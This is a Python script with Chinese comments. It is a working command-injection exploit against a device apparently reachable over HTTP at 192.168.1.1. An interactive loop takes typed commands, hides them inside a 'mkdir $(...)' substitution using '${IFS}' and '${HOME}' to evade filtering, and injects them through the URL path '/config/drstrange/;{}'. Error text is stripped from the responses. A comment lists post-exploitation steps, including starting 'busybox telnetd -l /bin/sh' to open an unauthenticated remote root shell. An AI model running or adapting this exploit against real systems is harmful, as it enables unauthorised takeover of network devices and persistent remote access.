import socket
import time

def send_raw_request(host, port, path_with_space, timeout=10):
    # 验证路径格式（确保以/开头，避免协议解析问题）
    if not path_with_space.startswith('/'):
        path_with_space = '/' + path_with_space
    
    # 构造HTTP请求报文（严格遵循HTTP格式的换行符和结构）
    request = (
        f"GET {path_with_space} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: RawHTTP/1.0\r\n"  # 添加用户代理标识
        "Accept: */*\r\n"
        "Connection: close\r\n"  # 告知服务器响应后关闭连接
        "\r\n"  # 空行标识请求头结束
    )
    
    response_data = b""  # 存储完整响应数据
    sock = None
    
    try:
        # 创建TCP socket并设置超时
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        
        # 连接目标主机
        # print(f"正在连接 {host}:{port}...")
        sock.connect((host, port))
        
        # print("连接成功，发送请求...")
        
        # 发送请求（确保完整发送）
        bytes_sent = sock.sendall(request.encode('utf-8'))
        if bytes_sent is None:  # sendall成功时返回None
            print(f"请求发送完成")
        
        # 循环接收响应（处理大响应，直到连接关闭）
        print("开始接收响应...")
        while True:
            try:
                # 每次接收4KB数据
                chunk = sock.recv(4096)
                if not chunk:  # 收到空数据表示连接已关闭
                    break
                response_data += chunk
                # 打印接收进度（每接收1MB提示一次）
                if len(response_data) % (1024 * 1024) == 0:
                    print(f"已接收 {len(response_data)//(1024*1024)}MB 数据...")
            except socket.timeout:
                print("接收超时，停止等待更多数据")
                break
        
        print("\n==== 完整响应内容 ====")
        # 尝试解码为字符串（支持多种编码容错）
        try:
            res = response_data.decode('utf-8')
            print(res.replace("mkdir: Cannot create directory", '').replace("Read-only file system", ''))
        except UnicodeDecodeError:
            print(response_data.decode('latin-1'))  # 尝试 latin-1 编码
        print("======================")
        
    except socket.timeout:
        print(f"错误：连接或接收超时（{timeout}秒）")
    except ConnectionRefusedError:
        print(f"错误：目标主机 {host}:{port} 拒绝连接")
    except socket.gaierror:
        print(f"错误：无法解析主机名 {host}")
    except Exception as e:
        print(f"发生意外错误：{str(e)}")
    finally:
        if sock:
            sock.close()
            print("\n连接已关闭\n")

if __name__ == "__main__":
    # 使用示例（请替换为实际测试的主机和路径）
    # 警告：此请求不符合HTTP规范，可能被服务器拒绝或拦截
    target_host = "192.168.1.1"  # 目标主机域名或IP
    target_port = 80             # HTTP默认端口（HTTPS请用443并修改请求格式）
    target_path = "/config/drstrange/;{}"  # 包含原始空格的路径
    '''To do After start up:
    ovs-vsctl set-fail-mode SDN-bridge standalone #enable normal tcp&udp connection
    /usr/local/busybox telnetd -l /bin/sh #start talnet service'''
    
    while True:
        t = input()
        cmd = "mkdir $({})".format(t).replace(' ', '${IFS}').replace('/','${HOME}')
        # cmd = '''/usr/local/shexec "{}"'''.format(t).replace(' ', '${IFS}').replace('/','${HOME}')
        # cmd = '''/tmp/busybox hush -c "{}"'''.format(t).replace(' ', '${IFS}').replace('/','${HOME}')
        send_raw_request(
            host=target_host,
            port=target_port,
            path_with_space=target_path.format(cmd),
            timeout=15  # 超时时间（秒）
    )
